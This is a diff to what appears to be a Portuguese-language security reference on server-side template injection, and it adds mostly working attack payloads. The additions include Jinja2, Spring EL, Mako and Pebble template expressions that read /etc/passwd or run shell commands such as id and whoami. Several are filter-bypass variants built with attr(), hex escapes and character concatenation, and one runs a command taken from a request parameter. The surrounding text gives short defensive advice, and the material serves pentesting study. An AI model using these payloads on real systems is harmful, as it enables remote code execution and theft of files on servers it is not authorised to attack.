@@ -85,6 +85,65 @@ ${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","id"})}
 # Smarty (PHP)
 {php}echo `id`;{/php}
 {system('id')}
+
+# Jinja2 -- info disclosure e enumeracao
+{{dump(app)}}
+{{config.items()}}
+{{request}}
+{{self}}
+{{app.request.server.all|join(',')}}
+
+# Jinja2 -- leitura de arquivo via indice de subclasse
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{ ''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
+
+# Jinja2 -- bypass via attr() (evita nomes bloqueados)
+{{ request|attr("__class__") }}
+{{ request|attr(["_"*2,"class","_"*2]|join) }}
+{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
+
+# Jinja2 -- globals via cycler/joiner/namespace (acesso direto a os)
+{{ cycler.__init__.__globals__.os }}
+{{ joiner.__init__.__globals__.os }}
+{{ namespace.__init__.__globals__.os }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}
+
+# Jinja2 -- reverse shell via loop de subclasses
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+
+# Spring EL (Java) -- payloads expandidos
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+# Bypass via concatenacao de caracteres (evita strings bloqueadas)
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+# Mako (Python) -- RCE via module tree (30+ caminhos)
+${self.module.cache.util.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.template.module.runtime.util.os.system("id")}
+${self.module.runtime.exceptions.util.os.system("id")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.template._mmarker.module.cache.util.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self.context._with_template.module.cache.util.os.system("id")}
+${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+
+# Pebble / Java ScriptEngineManager -- RCE via reflexao
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command('whoami'); x.start()")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command('uname','-a'); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
 ```
 
 Bypasses de WAF/filtros:
@@ -170,3 +229,6 @@ template = env.from_string("Olá {{ nome }}")
 return template.render(nome=user_input)
 ```
 9. Monitorar payloads com `{{`, `${`, `<#`, `#set`, `T(`, `Runtime`, `__class__`, `__globals__`.
+
+## Sources
+- Colecao de payloads SSTI (ssti.txt) -- 107 payloads cobrindo Jinja2, FreeMarker, ERB, Smarty, Twig, Spring EL, Mako, Pebble/ScriptEngineManager.
